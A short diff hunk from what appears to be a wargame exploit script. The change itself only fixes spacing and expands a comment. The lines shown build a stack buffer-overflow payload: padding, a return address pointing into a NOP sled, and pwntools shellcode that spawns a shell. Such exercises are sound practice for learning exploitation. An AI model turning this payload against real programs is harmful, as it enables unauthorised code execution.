@@ -80,7 +80,7 @@ dir = "/tmp/gil"+LEVEL+"/"
 
 payload = b""
 payload += bytes(padding, "utf-8")
-payload += pack(argv_10_adr + len_padding + 4 + 25,32)  # nop_adr = &env[10] + len_padding + 4 + 25 (half of nopslide)
+payload += pack(argv_10_adr + len_padding + 4 + 25, 32)  # nop_adr = &env[10] + len_padding + 4 (adr itself) + 25 (half of nopslide)
 payload += b"\x90"*50
 payload += asm(shellcraft.i386.linux.sh())
 
